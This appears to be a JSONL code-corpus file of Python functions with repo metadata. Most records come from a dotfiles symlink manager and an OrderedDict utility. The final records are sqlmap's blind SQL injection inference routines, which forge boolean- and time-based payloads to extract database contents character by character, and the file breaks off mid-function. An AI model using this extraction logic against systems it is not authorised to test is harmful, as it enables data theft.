{"docstring": "\"\"\"Ensure the directories for both name and target are in place.\n\nThis is needed for the 'add' and 'link' operations where the\ndirectory structure is expected to exist.\n\"\"\"\n", "func_signal": "def _ensure_dirs(self, debug):\n", "code": "def ensure(dir, debug):\n    if not dir.is_dir():\n        if debug:\n            echo('MKDIR  %s' % dir)\n        else:\n            dir.mkdir(parents=True)\n\nensure(self.name.parent, debug)\nensure(self.target.parent, debug)", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "# if not name.is_file() and not name.is_symlink():\n#     raise NotFound(name)\n", "func_signal": "def __init__(self, name, target):\n", "code": "self.name = Path(name)\nself.target = Path(target)", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Perform an operation on one or more dotfiles.\"\"\"\n", "func_signal": "def perform(method, files, repo, copy, debug):\n", "code": "for dotfile in repo.dotfiles(files):\n    try:\n        getattr(dotfile, method)(copy, debug)\n        if not debug:\n            msg = '%s%s' % (method, 'd' if method[-1] == 'e' else 'ed')\n            click.echo('%s %s' % (msg, dotfile.short_name(repo.home)))\n    except DotfileException as err:\n        click.echo(err)", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Unlink dotfiles from your home directory.\"\"\"\n", "func_signal": "def disable(repos, debug, files):\n", "code": "repo = single(repos)\nfiles = confirm('disable', files, repo)\nperform('disable', files, repo, False, debug)", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"TODO\"\"\"\n", "func_signal": "def show(repo, state):\n", "code": "for dotfile in repo.contents():\n    try:\n        display = state[dotfile.state]\n    except KeyError:\n        continue\n    char  = display['char']\n    name = dotfile.short_name(repo.home)\n    fg = display.get('color', None)\n    bold = display.get('bold', False)\n    click.secho('%c %s' % (char, name), fg=fg, bold=bold)", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Remove dotfiles from a repository.\"\"\"\n", "func_signal": "def remove(repos, debug, files):\n", "code": "repo = single(repos)\nfiles = confirm('remove', files, repo)\nperform('remove', files, repo, False, debug)\nif not debug:\n    # pruning will remove any remaining empty directories\n    repo.prune()", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Create a symlink from name to target, no error checking.\"\"\"\n", "func_signal": "def _link(self, debug, home):\n", "code": "source = self.name\ntarget = self.target\n\nif self.name.is_symlink():\n    source = self.target\n    target = self.name.resolve()\nelif self.RELATIVE_SYMLINKS:\n    target = os.path.relpath(target, source.parent)\n\nif debug:\n    echo('LINK   %s -> %s' % (source, target))\nelse:\n    source.symlink_to(target)", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Create a symlink or copy from name to target.\"\"\"\n", "func_signal": "def enable(self, copy=False, debug=False, home=Path.home()):\n", "code": "if copy:\n    raise NotImplementedError()\nif self.name.exists():\n    raise Exists(self.name)\nif not self.target.exists():\n    raise TargetMissing(self.name)\nself._ensure_dirs(debug)\nself._link(debug, home)", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "# TODO\n", "func_signal": "def _prune_dirs(self, debug):\n", "code": "if debug:\n    echo('PRUNE  <TODO>')", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Remove a symlink in the home directory, no error checking.\"\"\"\n", "func_signal": "def _unlink(self, debug):\n", "code": "if debug:\n    echo('UNLINK %s' % self.name)\nelse:\n    self.name.unlink()", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Show current status of dotfiles.\n\nBy default only non-OK dotfiles are shown.  This can be overridden\nwith the '-a, --all' flag.\n\nLegend:\n\n  l: symlink  c: copy  e: external symlink\n\n  ?: missing  !: conflict\n\nMeaning:\n\n  * Missing: Not found in your home directory.\n\n  * Conflict: Different from the file in your home directory.\n\"\"\"\n", "func_signal": "def status(repos, all, color):\n", "code": "bold = True if all and not color else False\nstate = {\n    'missing':  {'char': '?', 'bold': bold},\n    'conflict': {'char': '!', 'bold': bold},\n}\n\nif all:\n    state['link'] = {'char': 'l'}\n    state['copy'] = {'char': 'c'}\n    state['external'] = {'char': 'e'}\n\nif color:\n    state['missing'].update( {'color': 'yellow'})\n    state['conflict'].update({'color': 'magenta'})\n\nfor repo in repos:\n    show(repo, state)", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Remove a dotfile from name to target.\"\"\"\n", "func_signal": "def disable(self, copy=UNUSED, debug=False):\n", "code": "if not self.name.is_symlink():\n    raise NotASymlink(self.name)\nif self.name.exists():\n    if not self.target.exists():\n        raise TargetMissing(self.name)\n    if not self.name.samefile(self.target):\n        raise RuntimeError\nself._unlink(debug)\nself._prune_dirs(debug)", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Link dotfiles into your home directory.\"\"\"\n", "func_signal": "def enable(repos, copy, debug, files):\n", "code": "repo = single(repos)\nfiles = confirm('enable', files, repo)\nperform('enable', files, repo, copy, debug)", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Return a list of files, or all files if none were specified.\n\nWhen no files are specified, all files are assumed.  But before we\ngo ahead, confirm to make sure this is the intended operation.\n\"\"\"\n", "func_signal": "def confirm(method, files, repo):\n", "code": "if files:\n    # user has specified specific files, so we are not assuming all\n    return files\n# no files provided, so we assume all files after confirmation\nmessage = 'Are you sure you want to %s all dotfiles?' % method\nclick.confirm(message, abort=True)\nreturn str(repo).split()", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Raise an exception if multiple repositories are provided.\n\nCertain operations (add, remove, etc...) can only be applied to a\nsingle repository while other operations (list) can be applied\nacross multiple repositories.\n\"\"\"\n", "func_signal": "def single(repos):\n", "code": "if len(repos) > 1:\n    raise click.BadParameter('Must specify exactly one repository.',\n                             param_hint=['-r', '--repo'])\nreturn repos[0]", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Dotfiles is a tool to make managing your dotfile symlinks in $HOME easy,\nallowing you to keep all your dotfiles in a single directory.\n\"\"\"\n\n# temporary notice for folks tracking git\n", "func_signal": "def cli(ctx, repos):\n", "code": "import os\nif os.environ.get('DOTFILES_REPO'):\n    click.echo(\"Error: repository variable has changed to \\\"DOTFILES_REPOS\\\", please update\")\n    exit(-1)\n\ntry:\n    ctx.obj = Repositories(repos)\nexcept FileNotFoundError as e:\n    raise click.ClickException('Directory not found: %s' % e)", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Add dotfiles to a repository.\"\"\"\n", "func_signal": "def add(repos, copy, debug, files):\n", "code": "repo = single(repos)\nperform('add', files, repo, copy, debug)", "path": "dotfiles\\cli.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Move a dotfile to its target and create a link.\n\nThe link is either a symlink or a copy.\n\"\"\"\n", "func_signal": "def add(self, copy=False, debug=False, home=Path.home()):\n", "code": "if copy:\n    raise NotImplementedError()\nif self._is_present():\n    raise IsSymlink(self.name)\nif self.target.exists():\n    raise TargetExists(self.name)\nself._ensure_dirs(debug)\nif not self.name.is_symlink():\n    if debug:\n        echo('MOVE   %s -> %s' % (self.name, self.target))\n    else:\n        self.name.replace(self.target)\nself._link(debug, home)", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"Remove a dotfile and move target to its original location.\"\"\"\n", "func_signal": "def remove(self, copy=UNUSED, debug=False):\n", "code": "if not self.name.is_symlink():\n    raise NotASymlink(self.name)\nif not self.target.is_file():\n    raise TargetMissing(self.name)\nself._unlink(debug)\nif debug:\n    echo('MOVE   %s -> %s' % (self.target, self.name))\nelse:\n    self.target.replace(self.name)", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
{"docstring": "\"\"\"\nYou cannot assign to keys, but you can do slice assignment to re-order\nthem.\n\nYou can only do slice assignment if the new set of keys is a reordering\nof the original set.\n\"\"\"\n", "func_signal": "def __setitem__(self, index, name):\n", "code": "if isinstance(index, types.SliceType):\n    # FIXME: efficiency?\n    # check length is the same\n    indexes = range(len(self._main._sequence))[index]\n    if len(indexes) != len(name):\n        raise ValueError('attempt to assign sequence of size %s '\n            'to slice of size %s' % (len(name), len(indexes)))\n    # check they are the same keys\n    # FIXME: Use set\n    old_keys = self._main._sequence[index]\n    new_keys = list(name)\n    old_keys.sort()\n    new_keys.sort()\n    if old_keys != new_keys:\n        raise KeyError('Keylist is not the same as current keylist.')\n    orig_vals = [self._main[k] for k in name]\n    del self._main[index]\n    vals = zip(indexes, name, orig_vals)\n    vals.sort()\n    for i, k, v in vals:\n        if self._main.strict and k in self._main:\n            raise ValueError('slice assignment must be from '\n                'unique keys')\n        self._main.insert(i, k, v)\nelse:\n    raise ValueError('Cannot assign to keys')", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"Fetch the item at position i.\"\"\"\n", "func_signal": "def __getitem__(self, index):\n", "code": "if isinstance(index, types.SliceType):\n    # fetching a slice returns an OrderedDict\n    return self._main[index].items()\nkey = self._main._sequence[index]\nreturn (key, self._main[key])", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nUpdate from another OrderedDict or sequence of (key, value) pairs\n\n>>> d = OrderedDict(((1, 0), (0, 1)))\n>>> d.update(OrderedDict(((1, 3), (3, 2), (2, 1))))\n>>> d\nOrderedDict([(1, 3), (0, 1), (3, 2), (2, 1)])\n>>> d.update({4: 4})\nTraceback (most recent call last):\nTypeError: undefined order, cannot get items from dict\n>>> d.update((4, 4))\nTraceback (most recent call last):\nTypeError: cannot convert dictionary update sequence element \"4\" to a 2-item sequence\n\"\"\"\n", "func_signal": "def update(self, from_od):\n", "code": "if isinstance(from_od, OrderedDict):\n    for key, val in from_od.items():\n        self[key] = val\nelif isinstance(from_od, dict):\n    # we lose compatibility with other ordered dict types this way\n    raise TypeError('undefined order, cannot get items from dict')\nelse:\n    # FIXME: efficiency?\n    # sequence of 2-item sequences, or error\n    for item in from_od:\n        try:\n            key, val = item\n        except TypeError:\n            raise TypeError('cannot convert dictionary update'\n                ' sequence element \"%s\" to a 2-item sequence' % item)\n        self[key] = val", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nImplemented so that accesses to ``sequence`` raise a warning and are\ndiverted to the new ``setkeys`` method.\n\"\"\"\n", "func_signal": "def __setattr__(self, name, value):\n", "code": "if name == 'sequence':\n    warnings.warn('Use of the sequence attribute is deprecated.'\n        ' Use the keys method instead.', DeprecationWarning)\n    # NOTE: doesn't return anything\n    self.setkeys(value)\nelse:\n    # FIXME: do we want to allow arbitrary setting of attributes?\n    #   Or do we want to manage it?\n    object.__setattr__(self, name, value)", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\n>>> iv = OrderedDict(((1, 3), (3, 2), (2, 1))).itervalues()\n>>> iv.next()\n3\n>>> iv.next()\n2\n>>> iv.next()\n1\n>>> iv.next()\nTraceback (most recent call last):\nStopIteration\n\"\"\"\n", "func_signal": "def itervalues(self):\n", "code": "def make_iter(self=self):\n    keys = self.iterkeys()\n    while True:\n        yield self[keys.next()]\nreturn make_iter()", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\n>>> d = OrderedDict(((1, 3), (3, 2), (2, 1)))\n>>> del d[3]\n>>> d\nOrderedDict([(1, 3), (2, 1)])\n>>> del d[3]\nTraceback (most recent call last):\nKeyError: 3\n>>> d[3] = 2\n>>> d\nOrderedDict([(1, 3), (2, 1), (3, 2)])\n>>> del d[0:1]\n>>> d\nOrderedDict([(2, 1), (3, 2)])\n\"\"\"\n", "func_signal": "def __delitem__(self, key):\n", "code": "if isinstance(key, types.SliceType):\n    # FIXME: efficiency?\n    keys = self._sequence[key]\n    for entry in keys:\n        dict.__delitem__(self, entry)\n    del self._sequence[key]\nelse:\n    # do the dict.__delitem__ *first* as it raises\n    # the more appropriate error\n    dict.__delitem__(self, key)\n    self._sequence.remove(key)", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nImplemented so that access to ``sequence`` raises a warning.\n\n>>> d = OrderedDict()\n>>> d.sequence\n[]\n\"\"\"\n", "func_signal": "def __getattr__(self, name):\n", "code": "if name == 'sequence':\n    warnings.warn('Use of the sequence attribute is deprecated.'\n        ' Use the keys method instead.', DeprecationWarning)\n    # NOTE: Still (currently) returns a direct reference. Need to\n    #   because code that uses sequence will expect to be able to\n    #   mutate it in place.\n    return self._sequence\nelse:\n    # raise the appropriate error\n    raise AttributeError(\"OrderedDict has no '%s' attribute\" % name)", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nAllows slice assignment, so long as the slice is an OrderedDict\n>>> d = OrderedDict()\n>>> d['a'] = 'b'\n>>> d['b'] = 'a'\n>>> d[3] = 12\n>>> d\nOrderedDict([('a', 'b'), ('b', 'a'), (3, 12)])\n>>> d[:] = OrderedDict(((1, 2), (2, 3), (3, 4)))\n>>> d\nOrderedDict([(1, 2), (2, 3), (3, 4)])\n>>> d[::2] = OrderedDict(((7, 8), (9, 10)))\n>>> d\nOrderedDict([(7, 8), (2, 3), (9, 10)])\n>>> d = OrderedDict(((0, 1), (1, 2), (2, 3), (3, 4)))\n>>> d[1:3] = OrderedDict(((1, 2), (5, 6), (7, 8)))\n>>> d\nOrderedDict([(0, 1), (1, 2), (5, 6), (7, 8), (3, 4)])\n>>> d = OrderedDict(((0, 1), (1, 2), (2, 3), (3, 4)), strict=True)\n>>> d[1:3] = OrderedDict(((1, 2), (5, 6), (7, 8)))\n>>> d\nOrderedDict([(0, 1), (1, 2), (5, 6), (7, 8), (3, 4)])\n\n>>> a = OrderedDict(((0, 1), (1, 2), (2, 3)), strict=True)\n>>> a[3] = 4\n>>> a\nOrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a[::1] = OrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a\nOrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a[:2] = OrderedDict([(0, 1), (1, 2), (2, 3), (3, 4), (4, 5)])\nTraceback (most recent call last):\nValueError: slice assignment must be from unique keys\n>>> a = OrderedDict(((0, 1), (1, 2), (2, 3)))\n>>> a[3] = 4\n>>> a\nOrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a[::1] = OrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a\nOrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a[:2] = OrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a\nOrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a[::-1] = OrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> a\nOrderedDict([(3, 4), (2, 3), (1, 2), (0, 1)])\n\n>>> d = OrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> d[:1] = 3\nTraceback (most recent call last):\nTypeError: slice assignment requires an OrderedDict\n\n>>> d = OrderedDict([(0, 1), (1, 2), (2, 3), (3, 4)])\n>>> d[:1] = OrderedDict([(9, 8)])\n>>> d\nOrderedDict([(9, 8), (1, 2), (2, 3), (3, 4)])\n\"\"\"\n", "func_signal": "def __setitem__(self, key, val):\n", "code": "if isinstance(key, types.SliceType):\n    if not isinstance(val, OrderedDict):\n        # FIXME: allow a list of tuples?\n        raise TypeError('slice assignment requires an OrderedDict')\n    keys = self._sequence[key]\n    # NOTE: Could use ``range(*key.indices(len(self._sequence)))``\n    indexes = range(len(self._sequence))[key]\n    if key.step is None:\n        # NOTE: new slice may not be the same size as the one being\n        #   overwritten !\n        # NOTE: What is the algorithm for an impossible slice?\n        #   e.g. d[5:3]\n        pos = key.start or 0\n        del self[key]\n        newkeys = val.keys()\n        for k in newkeys:\n            if k in self:\n                if self.strict:\n                    raise ValueError('slice assignment must be from '\n                        'unique keys')\n                else:\n                    # NOTE: This removes duplicate keys *first*\n                    #   so start position might have changed?\n                    del self[k]\n        self._sequence = (self._sequence[:pos] + newkeys +\n            self._sequence[pos:])\n        dict.update(self, val)\n    else:\n        # extended slice - length of new slice must be the same\n        # as the one being replaced\n        if len(keys) != len(val):\n            raise ValueError('attempt to assign sequence of size %s '\n                'to extended slice of size %s' % (len(val), len(keys)))\n        # FIXME: efficiency?\n        del self[key]\n        item_list = zip(indexes, val.items())\n        # smallest indexes first - higher indexes not guaranteed to\n        # exist\n        item_list.sort()\n        for pos, (newkey, newval) in item_list:\n            if self.strict and newkey in self:\n                raise ValueError('slice assignment must be from unique'\n                    ' keys')\n            self.insert(pos, newkey, newval)\nelse:\n    if key not in self:\n        self._sequence.append(key)\n    dict.__setitem__(self, key, val)", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\n>>> d = OrderedDict(((1, 3), (3, 2), (2, 1)))\n>>> c = OrderedDict(((0, 3), (3, 2), (2, 1)))\n>>> e = OrderedDict(d)\n>>> c <= d\nTrue\n>>> d <= c\nFalse\n>>> d <= dict(c)\nTraceback (most recent call last):\nTypeError: Can only compare with other OrderedDicts\n>>> d <= e\nTrue\n\"\"\"\n", "func_signal": "def __le__(self, other):\n", "code": "if not isinstance(other, OrderedDict):\n    raise TypeError('Can only compare with other OrderedDicts')\n# FIXME: efficiency?\n#   Generate both item lists for each compare\nreturn (self.items() <= other.items())", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nReturns the query output length.\n\"\"\"\n\n", "func_signal": "def queryOutputLength(expression, payload):\n", "code": "infoMsg = \"retrieving the length of query output\"\nlogger.info(infoMsg)\n\nlengthExprUnescaped = agent.forgeQueryOutputLength(expression)\nstart = time.time()\ncount, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)\n\ndebugMsg = \"performed %d queries in %.2f seconds\" % (count, calculateDeltaSeconds(start))\nlogger.debug(debugMsg)\n\nif length == \" \":\n    length = 0\n\nreturn length", "path": "src\\pentest\\sqlmap\\lib\\techniques\\blind\\inference.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\n>>> d = OrderedDict(((1, 3), (3, 2), (2, 1)))\n>>> d != OrderedDict(d)\nFalse\n>>> d != OrderedDict(((1, 3), (2, 1), (3, 2)))\nTrue\n>>> d != OrderedDict(((1, 0), (3, 2), (2, 1)))\nTrue\n>>> d == OrderedDict(((0, 3), (3, 2), (2, 1)))\nFalse\n>>> d != dict(d)\nTrue\n>>> d != False\nTrue\n\"\"\"\n", "func_signal": "def __ne__(self, other):\n", "code": "if isinstance(other, OrderedDict):\n    # FIXME: efficiency?\n    #   Generate both item lists for each compare\n    return not (self.items() == other.items())\nelse:\n    return True", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"Set item at position i to item.\"\"\"\n", "func_signal": "def __setitem__(self, index, item):\n", "code": "if isinstance(index, types.SliceType):\n    # NOTE: item must be an iterable (list of tuples)\n    self._main[index] = OrderedDict(item)\nelse:\n    # FIXME: Does this raise a sensible error?\n    orig = self._main.keys[index]\n    key, value = item\n    if self._main.strict and key in self and (key != orig):\n        raise ValueError('slice assignment must be from '\n                'unique keys')\n    # delete the current one\n    del self._main[self._main._sequence[index]]\n    self._main.insert(index, key, value)", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nBisection algorithm that can be used to perform blind SQL injection\non an affected host\n\"\"\"\n\n", "func_signal": "def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):\n", "code": "abortedFlag = False\npartialValue = u\"\"\nfinalValue = None\nretrievedLength = 0\nasciiTbl = getCharset(charsetType)\ntimeBasedCompare = (kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))\nretVal = hashDBRetrieve(expression, checkConf=True)\n\nif retVal:\n    if PARTIAL_HEX_VALUE_MARKER in retVal:\n        retVal = retVal.replace(PARTIAL_HEX_VALUE_MARKER, \"\")\n\n        if retVal and conf.hexConvert:\n            partialValue = retVal\n            infoMsg = \"resuming partial value: %s\" % safecharencode(partialValue)\n            logger.info(infoMsg)\n    elif PARTIAL_VALUE_MARKER in retVal:\n        retVal = retVal.replace(PARTIAL_VALUE_MARKER, \"\")\n\n        if retVal and not conf.hexConvert:\n            partialValue = retVal\n            infoMsg = \"resuming partial value: %s\" % safecharencode(partialValue)\n            logger.info(infoMsg)\n    else:\n        infoMsg = \"resumed: %s\" % safecharencode(retVal)\n        logger.info(infoMsg)\n\n        return 0, retVal\n\ntry:\n    # Set kb.partRun in case \"common prediction\" feature (a.k.a. \"good\n    # samaritan\") is used or the engine is called from the API\n    if conf.predictOutput:\n        kb.partRun = getPartRun()\n    elif hasattr(conf, \"api\"):\n        kb.partRun = getPartRun(alias=False)\n    else:\n        kb.partRun = None\n\n    if partialValue:\n        firstChar = len(partialValue)\n    elif \"LENGTH(\" in expression.upper() or \"LEN(\" in expression.upper():\n        firstChar = 0\n    elif dump and conf.firstChar is not None and (isinstance(conf.firstChar, int) or (isinstance(conf.firstChar, basestring) and conf.firstChar.isdigit())):\n        firstChar = int(conf.firstChar) - 1\n    elif isinstance(firstChar, basestring) and firstChar.isdigit() or isinstance(firstChar, int):\n        firstChar = int(firstChar) - 1\n    else:\n        firstChar = 0\n\n    if \"LENGTH(\" in expression.upper() or \"LEN(\" in expression.upper():\n        lastChar = 0\n    elif dump and conf.lastChar is not None and (isinstance(conf.lastChar, int) or (isinstance(conf.lastChar, basestring) and conf.lastChar.isdigit())):\n        lastChar = int(conf.lastChar)\n    elif isinstance(lastChar, basestring) and lastChar.isdigit() or isinstance(lastChar, int):\n        lastChar = int(lastChar)\n    else:\n        lastChar = 0\n\n    if Backend.getDbms():\n        _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)\n        nulledCastedField = agent.nullAndCastField(fieldToCastStr)\n        expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)\n        expressionUnescaped = unescaper.escape(expressionReplaced)\n    else:\n        expressionUnescaped = unescaper.escape(expression)\n\n    if isinstance(length, basestring) and length.isdigit() or isinstance(length, int):\n        length = int(length)\n    else:\n        length = None\n\n    if length == 0:\n        return 0, \"\"\n\n    if length and (lastChar > 0 or firstChar > 0):\n        length = min(length, lastChar or length) - firstChar\n\n    if length and length > MAX_BISECTION_LENGTH:\n        length = None\n\n    showEta = conf.eta and isinstance(length, int)\n    numThreads = min(conf.threads, length)\n\n    if showEta:\n        progress = ProgressBar(maxValue=length)\n\n    if timeBasedCompare and conf.threads > 1:\n        warnMsg = \"multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically\"\n        singleTimeWarnMessage(warnMsg)\n\n    if numThreads > 1:\n        if not timeBasedCompare:\n            debugMsg = \"starting %d thread%s\" % (numThreads, (\"s\" if numThreads > 1 else \"\"))\n            logger.debug(debugMsg)\n        else:\n            numThreads = 1\n\n    if conf.threads == 1 and not timeBasedCompare and not conf.predictOutput:\n        warnMsg = \"running in a single-thread mode. Please consider \"\n        warnMsg += \"usage of option '--threads' for faster data retrieval\"\n        singleTimeWarnMessage(warnMsg)\n\n    if conf.verbose in (1, 2) and not showEta and not hasattr(conf, \"api\"):\n        if isinstance(length, int) and conf.threads > 1:\n            dataToStdout(\"[%s] [INFO] retrieved: %s\" % (time.strftime(\"%X\"), \"_\" * min(length, conf.progressWidth)))\n            dataToStdout(\"\\r[%s] [INFO] retrieved: \" % time.strftime(\"%X\"))\n        else:\n            dataToStdout(\"\\r[%s] [INFO] retrieved: \" % time.strftime(\"%X\"))\n\n    hintlock = threading.Lock()\n\n    def tryHint(idx):\n        with hintlock:\n            hintValue = kb.hintValue\n\n        if hintValue is not None and len(hintValue) >= idx:\n            if Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.MAXDB, DBMS.DB2):\n                posValue = hintValue[idx - 1]\n            else:\n                posValue = ord(hintValue[idx - 1])\n\n            forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue))\n            result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n            incrementCounter(kb.technique)\n\n            if result:\n                return hintValue[idx - 1]\n\n        with hintlock:\n            kb.hintValue = None\n\n        return None\n\n    def validateChar(idx, value):\n        \"\"\"\n        Used in time-based inference (in case that original and retrieved\n        value are not equal there will be a deliberate delay).\n        \"\"\"\n\n        if \"'%s'\" % CHAR_INFERENCE_MARK not in payload:\n            forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_NOT_EQUALS_CHAR), (expressionUnescaped, idx, value))\n        else:\n            # e.g.: ... > '%c' -> ... > ORD(..)\n            markingValue = \"'%s'\" % CHAR_INFERENCE_MARK\n            unescapedCharValue = unescaper.escape(\"'%s'\" % decodeIntToUnicode(value))\n            forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_NOT_EQUALS_CHAR), (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)\n\n        result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n        incrementCounter(kb.technique)\n\n        return not result\n\n    def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None):\n        \"\"\"\n        continuousOrder means that distance between each two neighbour's\n        numerical values is exactly 1\n        \"\"\"\n\n        result = tryHint(idx)\n\n        if result:\n            return result\n\n        if charTbl is None:\n            charTbl = type(asciiTbl)(asciiTbl)\n\n        originalTbl = type(charTbl)(charTbl)\n\n        if continuousOrder and shiftTable is None:\n            # Used for gradual expanding into unicode charspace\n            shiftTable = [2, 2, 3, 3, 5, 4]\n\n        if CHAR_INFERENCE_MARK in payload and ord('\\n') in charTbl:\n            charTbl.remove(ord('\\n'))\n\n        if not charTbl:\n            return None\n\n        elif len(charTbl) == 1:\n            forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))\n            result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n            incrementCounter(kb.technique)\n\n            if result:\n                return decodeIntToUnicode(charTbl[0])\n            else:\n                return None\n\n        maxChar = maxValue = charTbl[-1]\n        minChar = minValue = charTbl[0]\n\n        while len(charTbl) != 1:\n            position = (len(charTbl) >> 1)\n            posValue = charTbl[position]\n\n            if \"'%s'\" % CHAR_INFERENCE_MARK not in payload:\n                forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))\n            else:\n                # e.g.: ... > '%c' -> ... > ORD(..)\n                markingValue = \"'%s'\" % CHAR_INFERENCE_MARK\n                unescapedCharValue = unescaper.escape(\"'%s'\" % decodeIntToUnicode(posValue))\n                forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)\n\n            result = 